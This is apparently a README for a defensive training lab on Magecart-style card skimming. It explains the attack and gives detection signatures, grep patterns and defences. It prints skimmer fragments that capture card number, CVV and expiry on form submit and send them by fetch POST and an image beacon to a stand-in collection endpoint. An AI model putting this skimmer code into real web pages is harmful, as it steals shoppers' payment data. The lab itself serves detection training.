# Lab 1: Basic Magecart Attack

This lab demonstrates a **basic Magecart-style credit card skimming attack** that intercepts form submissions to steal payment data.

## Attack Overview

Classic Magecart attacks work by:

1. **Compromising legitimate JavaScript files** on e-commerce websites
2. **Appending malicious code** to the end of legitimate checkout scripts
3. **Intercepting form submissions** to capture payment card data
4. **Exfiltrating stolen data** to attacker-controlled C2 servers
5. **Maintaining stealth** by allowing legitimate checkout to proceed normally

## Key Characteristics

### Attack Vector

- **Target**: Form submission events on payment pages
- **Timing**: Post-submission capture (after user clicks "Pay")
- **Detection**: Network traffic analysis, file integrity monitoring
- **Stealth**: Legitimate functionality remains intact
- **Persistence**: Code appended to legitimate files

### Technical Approach

- **Form event listener** attachment via `addEventListener('submit')`
- **DOM querying** to locate payment form fields
- **Data extraction** from form inputs (card number, CVV, expiry)
- **HTTP POST exfiltration** to C2 server
- **Fallback image beacon** if primary exfiltration fails

## Detection Guide for Security Tools

### Primary Detection Signatures

#### 1. **Dual IIFE Pattern** (High Confidence)

**Location**: `/vulnerable-site/js/checkout-compromised.js:240-434`

```javascript
// LEGITIMATE CODE BLOCK
;(function () {
  'use strict'
  // ... legitimate checkout code ...
})()

// MALICIOUS CODE BLOCK (appears later in same file)
setTimeout(function () {
  ;(function () {
    'use strict'
    const CONFIG = {
      exfilUrl: 'http://localhost:9002/collect',
      delay: 200,
      debug: true
    }
    // ... skimmer code ...
  })()
}, 500)
```

**Detection Rule**: Two separate IIFE blocks in the same file, especially with setTimeout wrapping the second block.

#### 2. **CONFIG Object with C2 Endpoint** (Critical Indicator)

**Location**: `/vulnerable-site/js/checkout-compromised.js:245-249`

```javascript
const CONFIG = {
  exfilUrl: 'http://localhost:9002/collect',
  delay: 200,
  debug: true
}
```

**Detection Rule**: Look for configuration objects containing URLs to non-primary domains, especially with keys like `exfilUrl`, `c2Server`, `collectUrl`, or `beaconUrl`.

#### 3. **Form Submission Interception** (Behavioral Pattern)

**Location**: `/vulnerable-site/js/checkout-compromised.js:397-414`

```javascript
form.addEventListener('submit', function (event) {
  log('Form submission detected')
  const cardData = extractCardData()

  if (hasValidCardData(cardData)) {
    setTimeout(() => {
      exfiltrateData(cardData)
    }, CONFIG.delay)
  }

  // CRITICAL: Allow legitimate checkout to continue
})
```

**Detection Rule**: Event listeners that extract form data and make external network requests without preventing default form behavior.

#### 4. **Field Extraction Patterns** (Data Targeting)

**Location**: `/vulnerable-site/js/checkout-compromised.js:261-305`

```javascript
function extractCardData() {
  return {
    cardNumber: getFieldValue([
      '#card-number',
      'input[name="cardNumber"]',
      'input[autocomplete="cc-number"]'
    ]),
    cvv: getFieldValue([
      '#cvv',
      'input[name="cvv"]'
    ]),
    expiry: getFieldValue([
      '#expiry',
      'input[name="expiry"]'
    ])
    // ... plus metadata
  }
}
```

**Detection Rule**: Functions that systematically query multiple selectors for payment-specific fields (card numbers, CVV, expiry dates).

#### 5. **Exfiltration Methods** (Network Indicators)

**Location**: `/vulnerable-site/js/checkout-compromised.js:332-379`

```javascript
function exfiltrateData(data) {
  fetch(CONFIG.exfilUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data),
    mode: 'cors',
    credentials: 'omit'
  })
  .catch(error => {
    // Fallback method
    const img = new Image()
    const params = new URLSearchParams({
      d: btoa(JSON.stringify(data))
    })
    img.src = CONFIG.exfilUrl + '?' + params.toString()
  })
}
```

**Detection Rules**:
- POST requests to unexpected domains during form submission
- Image beacon fallback with base64-encoded data in query parameters
- Use of `credentials: 'omit'` to avoid sending cookies
- Multiple exfiltration attempts with different methods

### Network Traffic Patterns

**Outbound C2 Communication**:
```
POST http://localhost:9002/collect
Content-Type: application/json

{
  "cardNumber": "4532-1234-5678-9010",
  "cvv": "123",
  "expiry": "12/25",
  "cardholderName": "John Doe",
  "billingAddress": "123 Main St",
  "timestamp": 1704067200000,
  "url": "http://localhost:9001/checkout.html",
  "userAgent": "Mozilla/5.0...",
  "screenResolution": "1920x1080"
}
```

**Detection Indicators**:
- Unexpected POST requests during form submission
- JSON payloads containing payment card data
- Requests to non-payment-processor domains
- Timing: Requests triggered 200ms after form submission

### Browser DevTools Detection

**Open DevTools (F12) and check**:

1. **Network Tab**:
   - Filter by "collect" or "beacon"
   - Look for POST requests to unexpected domains
   - Examine request payloads for sensitive data

2. **Sources Tab**:
   - Navigate to `checkout-compromised.js`
   - Search for keywords: `exfilUrl`, `CONFIG`, `extractCardData`
   - Set breakpoints on line 397 (form submission handler)

3. **Console Tab**:
   - Enable "Preserve log"
   - Submit a test form
   - Look for `[SKIMMER]` log messages

### Static Analysis Detection

**Grep/ripgrep commands** to scan codebase:

```bash
# Search for exfiltration URLs
grep -r "exfilUrl\|c2Server\|collectUrl" --include="*.js" .

# Search for form event listeners
grep -r "addEventListener.*submit" --include="*.js" .

# Search for suspicious setTimeout with IIFE
grep -r "setTimeout.*function.*CONFIG" --include="*.js" .

# Search for data extraction patterns
grep -r "cardNumber\|cvv.*expiry" --include="*.js" .

# Search for fetch/beacon patterns
grep -r "fetch.*POST\|new Image.*src" --include="*.js" .
```

### File Integrity Monitoring

**Critical files to monitor**:
- `/vulnerable-site/js/checkout.js` → Should match `checkout-compromised.js` lines 1-239
- Any unexpected changes to checkout-related JavaScript files
- File size increases (skimmer code adds ~200 lines)

### Runtime Behavior Detection

**Behavioral indicators to monitor**:

1. **Event Listener Anomalies**:
   - Multiple submit listeners on payment forms
   - Submit listeners added dynamically after page load
   - Submit listeners that don't call `preventDefault()`

2. **Network Activity Patterns**:
   - POST requests outside payment processor domains
   - Requests triggered 200-500ms after form submission
   - Failed fetch requests followed by image beacon attempts

3. **DOM Query Patterns**:
   - Repeated queries for payment field selectors
   - Systematic enumeration of card-related input fields
   - Field value extraction during submit events

## Real-World Context

This lab simulates attacks similar to:

- **British Airways breach** (2018): 380,000 customers affected
- **Ticketmaster breach** (2018): 40,000 customers affected
- **Newegg breach** (2018): 1-month persistent attack
- **Magecart Group 4, 5, 6, 12**: Various e-commerce compromises

## ML Training Value

This lab provides training data for:

### Code Pattern Recognition

- Dual IIFE structures in single files
- Configuration objects with external URLs
- Form event listener patterns
- Data extraction function signatures
- Exfiltration method implementations

### Network Traffic Analysis

- C2 communication protocols
- Payload structure and content
- Timing patterns relative to user actions
- Fallback exfiltration mechanisms

### Behavioral Analysis

- Form submission interception
- Dynamic event listener attachment
- Systematic field value extraction
- Multi-method exfiltration attempts

## Educational Objectives

### Understanding Basic Skimming

- Learn how attackers compromise JavaScript files
- Understand form interception techniques
- Explore data extraction methodologies
- Analyze exfiltration strategies

### Detection Development

- Develop file integrity monitoring systems
- Create network traffic analysis rules
- Build behavioral detection models
- Train ML models on skimming patterns

### Defense Strategies

- Implement Subresource Integrity (SRI) tags
- Deploy Content Security Policy (CSP)
- Use File Integrity Monitoring (FIM)
- Monitor for suspicious network traffic
- Audit JavaScript files for unauthorized changes

## File Structure

```
01-basic-magecart/
├── vulnerable-site/           # Target e-commerce website
│   ├── index.html            # Store homepage
│   ├── checkout.html         # Checkout page (loads compromised JS)
│   ├── js/
│   │   ├── checkout.js            # Original legitimate code
│   │   └── checkout-compromised.js # Legitimate + skimmer
│   ├── css/
│   │   └── style.css         # Website styles
│   └── images/               # Product images
├── malicious-code/           # C2 server infrastructure
│   └── c2-server/
│       ├── server.js         # Data collection server
│       ├── dashboard.html    # Stolen data viewer
│       └── package.json      # Server dependencies
└── test/                     # Playwright test suite
    └── tests/
        └── cc-exfiltration.spec.js
```

## Usage

1. **Start the vulnerable site**: Serves the compromised e-commerce checkout
2. **Deploy C2 server**: Receives and logs stolen payment data
3. **Submit test payment**: Use test card numbers (4532-1234-5678-9010)
4. **Observe exfiltration**: Monitor network traffic and C2 dashboard
5. **Analyze behavior**: Study detection signatures and patterns

This lab provides foundational training for detecting Magecart-style attacks that have compromised thousands of e-commerce websites worldwide.
